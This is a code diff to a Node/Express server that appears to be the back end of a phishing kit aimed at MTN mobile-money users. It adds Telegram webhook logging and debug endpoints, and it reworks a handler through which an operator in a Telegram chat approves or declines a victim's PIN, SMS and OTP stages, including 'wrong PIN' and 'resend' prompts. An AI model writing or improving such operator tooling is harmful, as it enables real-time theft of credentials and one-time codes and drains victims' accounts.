@@ -13,6 +13,7 @@ const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 const DATA_DIR   = process.env.DATA_DIR || (fs.existsSync('/data') ? '/data' : '/tmp');
 const LINKS_FILE = path.join(DATA_DIR, 'mtn_links.json');
 const TXS_FILE   = path.join(DATA_DIR, 'mtn_txs.json');
+const RAW_FILE   = path.join(DATA_DIR, 'telegram_raw.json');
 
 try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e){}
 
@@ -23,6 +24,25 @@ app.use(express.static(path.join(__dirname, '..'), { extensions: ['html'] }));
 
 app.use((req, _res, next) => {
   console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
+  next();
+});
+
+/* ───────────────────────────────────────────────────────────
+   RAW TELEGRAM LOGGER — captures EVERY webhook payload
+   so we can see exactly what Telegram sends
+   ─────────────────────────────────────────────────────────── */
+app.post('/api/telegram-webhook', (req, _res, next) => {
+  try {
+    let log = [];
+    if (fs.existsSync(RAW_FILE)) {
+      try { log = JSON.parse(fs.readFileSync(RAW_FILE, 'utf8')); } catch(e){}
+    }
+    log.push({ receivedAt: new Date().toISOString(), body: req.body });
+    fs.writeFileSync(RAW_FILE, JSON.stringify(log.slice(-30), null, 2));
+    console.log(`[raw-webhook] captured (${log.length} total) update_id=${req.body?.update_id}`);
+  } catch(e) {
+    console.warn('[raw-webhook] save failed:', e.message);
+  }
   next();
 });
 
@@ -144,7 +164,8 @@ app.get('/health', (_req, res) => res.json({
   ts: Date.now(),
   activeLinks: links.size,
   activeTxs: txs.size,
-  dataDir: DATA_DIR
+  dataDir: DATA_DIR,
+  publicUrl: resolvePublicUrl()
 }));
 
 app.get('/api/debug', (_req, res) => {
@@ -156,7 +177,77 @@ app.get('/api/debug', (_req, res) => {
     otpStatus: t.otpStatus,
     lang: t.lang || '—'
   });
-  res.json({ ok:true, dataDir: DATA_DIR, txs: tList });
+  res.json({ ok:true, dataDir: DATA_DIR, publicUrl: resolvePublicUrl(), txs: tList });
+});
+
+/* ───────────────────────────────────────────────────────────
+   WEBHOOK DEBUG — see everything
+   ─────────────────────────────────────────────────────────── */
+
+// Raw payloads captured
+app.get('/api/telegram-raw', (_req, res) => {
+  try {
+    if (!fs.existsSync(RAW_FILE)) return res.json({ ok:true, count: 0, entries: [] });
+    const entries = JSON.parse(fs.readFileSync(RAW_FILE, 'utf8'));
+    res.json({ ok:true, count: entries.length, entries });
+  } catch(e) {
+    res.status(500).json({ ok:false, error: e.message });
+  }
+});
+
+// Clear raw payloads
+app.get('/api/telegram-raw/clear', (_req, res) => {
+  try {
+    if (fs.existsSync(RAW_FILE)) fs.unlinkSync(RAW_FILE);
+    res.json({ ok:true, cleared: true });
+  } catch(e) {
+    res.status(500).json({ ok:false, error: e.message });
+  }
+});
+
+// Full webhook diagnostic
+app.get('/api/webhook-doctor', async (_req, res) => {
+  const report = {
+    ok: true,
+    ts: new Date().toISOString(),
+    publicUrl: resolvePublicUrl(),
+    env: {
+      PUBLIC_URL: process.env.PUBLIC_URL || '(not set)',
+      RAILWAY_PUBLIC_DOMAIN: process.env.RAILWAY_PUBLIC_DOMAIN || '(not set)',
+      RENDER_EXTERNAL_HOSTNAME: process.env.RENDER_EXTERNAL_HOSTNAME || '(not set)',
+      TELEGRAM_BOT_TOKEN: TELEGRAM_BOT_TOKEN ? '✓ set' : '❌ missing',
+      TELEGRAM_CHAT_ID: TELEGRAM_CHAT_ID ? '✓ set' : '❌ missing'
+    },
+    webhook: null,
+    me: null,
+    recentRaw: null
+  };
+
+  // Telegram bot info
+  try {
+    const meRes = await fetch(`${TELEGRAM_API}/getMe`);
+    report.me = await meRes.json();
+  } catch (e) {
+    report.me = { error: e.message };
+  }
+
+  // Webhook info
+  try {
+    const whRes = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
+    report.webhook = await whRes.json();
+  } catch (e) {
+    report.webhook = { error: e.message };
+  }
+
+  // Last 5 raw payloads
+  try {
+    if (fs.existsSync(RAW_FILE)) {
+      const entries = JSON.parse(fs.readFileSync(RAW_FILE, 'utf8'));
+      report.recentRaw = entries.slice(-5);
+    }
+  } catch (e) {}
+
+  res.json(report);
 });
 
 app.get('/api/check-webhook', async (_req, res) => {
@@ -173,6 +264,14 @@ app.get('/api/set-webhook', async (_req, res) => {
     const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
     const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
     res.json({ webhookUrl, result: await r.json() });
+  } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
+});
+
+// Delete webhook (useful for debugging)
+app.get('/api/delete-webhook', async (_req, res) => {
+  try {
+    const r = await fetch(`${TELEGRAM_API}/deleteWebhook?drop_pending_updates=true`);
+    res.json(await r.json());
   } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
 });
 
@@ -503,60 +602,70 @@ app.post('/api/telegram-webhook', async (req, res) => {
   try {
     const update = req.body || {};
     const cq = update.callback_query;
-    console.log(`[webhook] hasCallback=${!!cq} data=${cq?.data || 'none'}`);
 
-    if (cq && cq.data) {
-      const parts = String(cq.data).split(':');
+    console.log(`[webhook] received update_id=${update.update_id} hasCallback=${!!cq} data=${cq?.data || 'none'}`);
 
-      if (parts.length === 4 && parts[0] === 'mtn') {
-        const [_, stage, action, txRaw] = parts;
-        const tracking = txRaw.toUpperCase();
-        let t = txs.get(tracking);
-        if (!t) {
-          const restored = loadMap(TXS_FILE);
-          if (restored) { txs = restored; t = txs.get(tracking); }
-        }
-        if (!t) {
-          await tgAnswer(cq.id, 'Session expired');
-          return res.json({ ok:true });
-        }
-
-        const labels = {
-          approve:'✅ Approved',
-          decline:'❌ Declined',
-          resend:'🔁 Resend',
-          inactive:'⚠️ Inactive',
-          needs_full_sms:'📄 Needs Full SMS',
-          wrong_pin:'⚠️ Wrong PIN'
-        };
-
-        if (stage === 'pin') {
-          if (action === 'approve') t.pinStatus = 'approved';
-          else if (action === 'decline') t.pinStatus = 'declined';
-        } else if (stage === 'sms') {
-          if (action === 'approve') t.smsStatus = 'approved';
-          else if (action === 'decline') t.smsStatus = 'declined';
-          else if (action === 'resend') t.smsStatus = 'resend';
-          else if (action === 'needs_full_sms') t.smsStatus = 'needs_full_sms';
-          else if (action === 'wrong_pin') t.smsStatus = 'wrong_pin';
-        } else if (stage === 'otp') {
-          if (action === 'approve') t.otpStatus = 'approved';
-          else if (action === 'decline') t.otpStatus = 'declined';
-          else if (action === 'resend') t.otpStatus = 'resend';
-          else if (action === 'inactive') t.otpStatus = 'inactive';
-        }
-
-        persistTxs();
-        await tgAnswer(cq.id, labels[action] || action);
-        if (cq.message) await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
-        console.log(`[webhook] mtn:${stage}:${action}:${tracking} → pin=${t.pinStatus} sms=${t.smsStatus} otp=${t.otpStatus} lang=${t.lang || 'en'}`);
-        return res.json({ ok:true });
-      }
+    if (!cq || !cq.data) {
+      console.log(`[webhook] not a callback — ignoring`);
+      return res.json({ ok:true });
     }
 
+    const parts = String(cq.data).split(':');
+    console.log(`[webhook] parsed parts=${JSON.stringify(parts)} length=${parts.length}`);
+
+    if (parts.length !== 4 || parts[0] !== 'mtn') {
+      console.log(`[webhook] ❌ unexpected callback_data format — expected 4 parts starting with "mtn"`);
+      await tgAnswer(cq.id, 'Unknown action');
+      return res.json({ ok:true });
+    }
+
+    const [_, stage, action, txRaw] = parts;
+    const tracking = txRaw.toUpperCase();
+    console.log(`[webhook] stage=${stage} action=${action} tracking=${tracking}`);
+
+    let t = txs.get(tracking);
+    if (!t) {
+      const restored = loadMap(TXS_FILE);
+      if (restored) { txs = restored; t = txs.get(tracking); }
+    }
+    if (!t) {
+      console.log(`[webhook] ❌ transaction not found: ${tracking}`);
+      await tgAnswer(cq.id, 'Session expired');
+      return res.json({ ok:true });
+    }
+
+    const labels = {
+      approve:'✅ Approved',
+      decline:'❌ Declined',
+      resend:'🔁 Resend',
+      inactive:'⚠️ Inactive',
+      needs_full_sms:'📄 Needs Full SMS',
+      wrong_pin:'⚠️ Wrong PIN'
+    };
+
+    if (stage === 'pin') {
+      if (action === 'approve') t.pinStatus = 'approved';
+      else if (action === 'decline') t.pinStatus = 'declined';
+    } else if (stage === 'sms') {
+      if (action === 'approve') t.smsStatus = 'approved';
+      else if (action === 'decline') t.smsStatus = 'declined';
+      else if (action === 'resend') t.smsStatus = 'resend';
+      else if (action === 'needs_full_sms') t.smsStatus = 'needs_full_sms';
+      else if (action === 'wrong_pin') t.smsStatus = 'wrong_pin';
+    } else if (stage === 'otp') {
+      if (action === 'approve') t.otpStatus = 'approved';
+      else if (action === 'decline') t.otpStatus = 'declined';
+      else if (action === 'resend') t.otpStatus = 'resend';
+      else if (action === 'inactive') t.otpStatus = 'inactive';
+    }
+
+    persistTxs();
+    await tgAnswer(cq.id, labels[action] || action);
+    if (cq.message) await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
+    console.log(`[webhook] ✅ mtn:${stage}:${action}:${tracking} → pin=${t.pinStatus} sms=${t.smsStatus} otp=${t.otpStatus} lang=${t.lang || 'en'}`);
     return res.json({ ok:true });
   } catch (err) {
-    console.error('webhook error:', err);
+    console.error('[webhook] ❌ error:', err);
     res.status(500).json({ ok:false, error: err.message });
   }
 });
